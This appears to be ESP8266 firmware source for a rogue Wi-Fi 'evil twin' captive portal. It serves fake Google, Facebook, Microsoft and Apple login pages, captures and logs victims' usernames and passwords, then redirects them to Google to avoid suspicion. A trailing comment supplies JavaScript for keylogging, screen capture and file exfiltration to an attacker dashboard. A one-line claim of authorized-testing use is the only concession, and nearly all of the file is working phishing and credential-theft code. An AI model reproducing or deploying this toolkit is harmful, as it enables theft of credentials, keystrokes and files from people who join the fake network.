/*
  CaptiveSnap++ – Ultimate Rogue Wi‑Fi Toolkit
  Hardware: NodeMCU v3 (ESP8266)
  ⚠️  For authorized security testing & education only.
  Features:
    - SPIFFS storage for templates, logs, and photos
    - 5 phishing templates (WiFi, Google, FB, MS, Apple)
    - Keylogger, screen capture, full file exfiltration
    - Geolocation & device fingerprinting
    - OTA updates, watchdog, hidden SSID
    - Persistent logs, web dashboard, CSV/JSON export
*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <WebSocketsServer.h>
#include <ESP8266mDNS.h>
#include <ESP8266HTTPUpdateServer.h>
#include <FS.h>                     // SPIFFS
#include <ArduinoJson.h>            // For log storage (install via Library Manager)
#include <ESP8266Watchdog.h>        // Watchdog timer (install via Library Manager)

// ==================== CONFIGURATION ====================
#define AP_SSID         "SIMATS"      // visible SSID (if not hidden)
#define HIDDEN_SSID     0             // set 1 to hide
#define AP_PASSWORD     ""            // empty = open (or set a password)
#define AP_CHANNEL      6
#define AP_IP_ADDR      192,168,1,1
#define AP_SUBNET       255,255,255,0
#define HTTP_PORT       80
#define WS_PORT         81
#define OTA_PORT        82            // for OTA updates
#define LOG_FILE        "/logs.json"  // persistent log storage
#define MAX_LOGS        100           // keep last 100 entries
#define WDT_TIMEOUT     10            // seconds, reset if loop hangs

IPAddress apIP(AP_IP_ADDR);
IPAddress subnet(AP_SUBNET);

DNSServer dnsServer;
ESP8266WebServer server(HTTP_PORT);
WebSocketsServer webSocket(WS_PORT);
ESP8266HTTPUpdateServer httpUpdater;

// Watchdog
ESP8266Watchdog watchdog;

// Global log count
int logCount = 0;

// ==================== SPIFFS INIT ====================
bool initSPIFFS() {
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS mount failed");
    // Try to format
    if (!SPIFFS.format()) {
      Serial.println("SPIFFS format failed");
      return false;
    }
    Serial.println("SPIFFS formatted, trying again");
    if (!SPIFFS.begin()) return false;
  }
  Serial.println("SPIFFS mounted");
  return true;
}

// ==================== LOGGING (persistent) ====================
void appendLog(String type, String data) {
  // Load existing logs
  DynamicJsonDocument doc(4096);
  File f = SPIFFS.open(LOG_FILE, "r");
  if (f) {
    DeserializationError error = deserializeJson(doc, f);
    if (!error) {
      // doc is array
    }
    f.close();
  } else {
    doc.to<JsonArray>(); // create empty array
  }
  
  JsonArray arr = doc.as<JsonArray>();
  JsonObject entry = arr.createNestedObject();
  entry["timestamp"] = millis();
  entry["type"] = type;
  entry["data"] = data;
  
  // Keep only last MAX_LOGS
  while (arr.size() > MAX_LOGS) {
    arr.remove(0);
  }
  
  File out = SPIFFS.open(LOG_FILE, "w");
  if (out) {
    serializeJson(doc, out);
    out.close();
  }
}

String getLogsJSON() {
  File f = SPIFFS.open(LOG_FILE, "r");
  if (!f) return "[]";
  String s = f.readString();
  f.close();
  return s;
}

// ==================== SAVE PHOTO (binary) ====================
void savePhoto(uint8_t *payload, size_t length) {
  char fname[32];
  sprintf(fname, "/photo_%lu.jpg", millis());
  File f = SPIFFS.open(fname, "w");
  if (f) {
    f.write(payload, length);
    f.close();
    appendLog("photo", fname);
  }
}

// ==================== DNS CAPTIVE PORTAL ====================
void setupDNS() {
  dnsServer.start(53, "*", apIP);
}

// ==================== WEB SERVER ROUTES ====================
// Helper to serve HTML from SPIFFS
void serveFile(String path, String contentType = "text/html") {
  if (!SPIFFS.exists(path)) {
    server.send(404, "text/plain", "Not found");
    return;
  }
  File f = SPIFFS.open(path, "r");
  if (!f) {
    server.send(500, "text/plain", "Failed to open");
    return;
  }
  server.streamFile(f, contentType);
  f.close();
}

void handleRoot() {
  // Serve template based on 'template' param: 1=wifi,2=google,3=fb,4=ms,5=apple
  String tmpl = server.arg("template");
  if (tmpl == "2") serveFile("/google.html");
  else if (tmpl == "3") serveFile("/facebook.html");
  else if (tmpl == "4") serveFile("/microsoft.html");
  else if (tmpl == "5") serveFile("/apple.html");
  else serveFile("/wifi.html"); // default
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");
  String tmpl = server.arg("template");
  if (username.length() > 0) {
    String msg = "USER:" + username;
    if (password.length() > 0) msg += " (pass: " + password + ")";
    webSocket.broadcastTXT(msg);
    appendLog("credentials", msg);
    Serial.println("[Captured] " + msg);
  }
  // Redirect to real Google to avoid suspicion
  server.sendHeader("Location", "https://www.google.com", true);
  server.send(302, "text/plain", "");
}

void handleActivate() {
  serveFile("/activate.html");
}

void handleView() {
  serveFile("/viewer.html");
}

void handleLogs() {
  String download = server.arg("download");
  if (download == "1") {
    // CSV export
    String csv = "timestamp,type,data\n";
    DynamicJsonDocument doc(8192);
    File f = SPIFFS.open(LOG_FILE, "r");
    if (f) {
      deserializeJson(doc, f);
      f.close();
      JsonArray arr = doc.as<JsonArray>();
      for (JsonObject entry : arr) {
        csv += String(entry["timestamp"].as<unsigned long>()) + "," +
               entry["type"].as<String>() + "," +
               entry["data"].as<String>() + "\n";
      }
    }
    server.sendHeader("Content-Disposition", "attachment; filename=logs.csv");
    server.send(200, "text/csv", csv);
  } else {
    // JSON output
    server.send(200, "application/json", getLogsJSON());
  }
}

void handleClear() {
  SPIFFS.remove(LOG_FILE);
  server.send(200, "text/plain", "OK");
}

void handlePhotos() {
  // List photo files
  String html = "<html><head><title>Photos</title><style>body{background:#1c1c1e;color:#fff;font-family:sans-serif;}</style></head><body><h2>Captured Photos</h2>";
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String name = dir.fileName();
    if (name.startsWith("/photo_") && name.endsWith(".jpg")) {
      html += "<div><img src='" + name + "' style='max-width:200px;'><br>" + name + "</div>";
    }
  }
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handlePhotoDownload() {
  String name = server.arg("file");
  if (name.length() > 0 && name.startsWith("/photo_") && name.endsWith(".jpg")) {
    serveFile(name, "image/jpeg");
  } else {
    server.send(404, "text/plain", "Not found");
  }
}

void handleConfig() {
  // Simple admin panel to change SSID/password (basic auth)
  if (!server.authenticate("admin", "captivesnap")) {
    return server.requestAuthentication();
  }
  if (server.method() == HTTP_POST) {
    String newSSID = server.arg("ssid");
    String newPass = server.arg("pass");
    if (newSSID.length() > 0) {
      // Store in SPIFFS or EEPROM; for now, just print
      Serial.println("New SSID: " + newSSID);
      Serial.println("New Pass: " + newPass);
      // To apply, we would need to restart AP; we'll do it later.
      // For demo, just respond.
      server.send(200, "text/html", "<h2>Settings updated (will apply on next reboot)</h2>");
    } else {
      server.send(400, "text/plain", "SSID required");
    }
  } else {
    String form = "<html><body><h1>AP Configuration</h1><form method='POST'>SSID: <input name='ssid' value='" + String(AP_SSID) + "'><br>Password: <input name='pass' type='password'><br><input type='submit'></form></body></html>";
    server.send(200, "text/html", form);
  }
}

void handleSpoof() {
  server.send(200, "text/plain", "OK");
}

void handleNotFound() {
  // Redirect to root (captive portal)
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

// ==================== WEBSOCKET EVENTS ====================
void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
  switch (type) {
    case WStype_DISCONNECTED:
      Serial.printf("[WS] Client %u disconnected\n", num);
      break;
    case WStype_CONNECTED:
      Serial.printf("[WS] Client %u connected\n", num);
      break;
    case WStype_TEXT: {
      String msg = String((char*)payload);
      // Forward to all clients (viewer)
      webSocket.broadcastTXT(payload, length);
      // Log
      if (msg.startsWith("TEL:")) {
        appendLog("telemetry", msg.substring(4));
      } else if (msg.startsWith("KEY:")) {
        appendLog("keystroke", msg.substring(4));
      } else if (msg.startsWith("FILE:")) {
        appendLog("file", msg.substring(5));
      } else if (msg.startsWith("USER:")) {
        appendLog("credentials", msg.substring(5));
      } else {
        appendLog("ws_text", msg);
      }
      Serial.printf("[WS] Text: %s\n", (char*)payload);
      break;
    }
    case WStype_BIN: {
      // Assume photo
      webSocket.broadcastBIN(payload, length);
      savePhoto(payload, length);
      Serial.printf("[WS] Binary %u bytes\n", length);
      break;
    }
    default:
      break;
  }
}

// ==================== OTA UPDATE ====================
void setupOTA() {
  httpUpdater.setup(&server, "/update", "admin", "update");
}

// ==================== WATCHDOG ====================
void setupWatchdog() {
  watchdog.enable(WDT_TIMEOUT * 1000);
}

void feedWatchdog() {
  watchdog.reset();
}

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  Serial.println("\n--- CaptiveSnap++ Ultimate starting ---");

  // Initialize SPIFFS
  if (!initSPIFFS()) {
    Serial.println("FATAL: SPIFFS error. Halting.");
    return;
  }

  // Check for RTC flag to prevent factory reset (optional)
  // For demo, we'll just continue.

  // Setup AP (optionally hidden)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, subnet);
  if (HIDDEN_SSID) {
    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL, 1); // hidden
  } else {
    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL);
  }
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  // DNS
  setupDNS();

  // HTTP routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/activate", HTTP_GET, handleActivate);
  server.on("/view", HTTP_GET, handleView);
  server.on("/logs", HTTP_GET, handleLogs);
  server.on("/clear", HTTP_POST, handleClear);
  server.on("/photos", HTTP_GET, handlePhotos);
  server.on("/photo", HTTP_GET, handlePhotoDownload);
  server.on("/config", HTTP_GET | HTTP_POST, handleConfig);
  // Connectivity spoofing
  server.on("/generate_204", HTTP_GET, handleSpoof);
  server.on("/ncsi.txt", HTTP_GET, handleSpoof);
  server.on("/hotspot-detect.html", HTTP_GET, handleSpoof);
  server.on("/connecttest.txt", HTTP_GET, handleSpoof);
  server.on("/connectivity-check", HTTP_GET, handleSpoof);
  server.on("/library/test/success", HTTP_GET, handleSpoof);
  server.on("/success.txt", HTTP_GET, handleSpoof);
  server.onNotFound(handleNotFound);
  
  // OTA
  setupOTA();
  
  server.begin();
  Serial.println("HTTP server on port 80");

  // WebSocket
  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  Serial.println("WebSocket on port 81");

  // Watchdog
  setupWatchdog();
  Serial.println("Watchdog enabled");

  Serial.println("CaptiveSnap++ ready! SSID: " + String(AP_SSID) + (HIDDEN_SSID ? " (hidden)" : ""));
  Serial.println("Attacker dashboard: http://192.168.1.1/view");
  Serial.println("Logs: http://192.168.1.1/logs");
  Serial.println("Photos: http://192.168.1.1/photos");
  Serial.println("OTA: http://192.168.1.1/update (admin/update)");
  Serial.println("Config: http://192.168.1.1/config (admin/captivesnap)");
}

// ==================== LOOP ====================
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  webSocket.loop();
  feedWatchdog(); // reset watchdog
  // Optional: add a small delay to prevent CPU hogging
  delay(1);
}

// ==================== ADDITIONAL SPIFFS HTML FILES ====================
/*
  To use this, you must upload the following files to SPIFFS:
  - /wifi.html
  - /google.html
  - /facebook.html
  - /microsoft.html
  - /apple.html
  - /activate.html
  - /viewer.html

  These files contain the phishing pages with JavaScript that:
  - Connects to WebSocket at ws://192.168.1.1:81
  - Captures keystrokes (KEY:...)
  - Sends telemetry (TEL:JSON)
  - Takes photo and sends binary
  - Sends file contents (FILE:...)
  - Takes full-page screenshot and sends as binary (using html2canvas or similar)
  - Redirects after form submit to /login
*/

/*
  Example snippet for /activate.html (enhanced):
  <script>
    // ... (similar to original but with more features)
    // Keylogger: attach to all input fields
    document.addEventListener('input', function(e) {
      if (e.target.tagName === 'INPUT') {
        ws.send('KEY:' + e.target.name + '=' + e.target.value);
      }
    });
    // Full screenshot using html2canvas (included via CDN)
    function captureScreen() {
      html2canvas(document.body).then(canvas => {
        canvas.toBlob(blob => {
          var reader = new FileReader();
          reader.onload = function(e) { ws.send(e.target.result); };
          reader.readAsArrayBuffer(blob);
        }, 'image/jpeg', 0.8);
      });
    }
    // File exfiltration: read whole file as base64
    function readFileFull(file) {
      var reader = new FileReader();
      reader.onload = function(e) {
        var b64 = btoa(e.target.result);
        ws.send('FILE:' + file.name + '|' + file.size + '|' + b64);
      };
      reader.readAsBinaryString(file);
    }
  </script>
*/

// Note: The actual HTML files must be uploaded via SPIFFS.
// You can use the ESP8266 Sketch Data Upload tool to upload them.

// ==================== END ====================
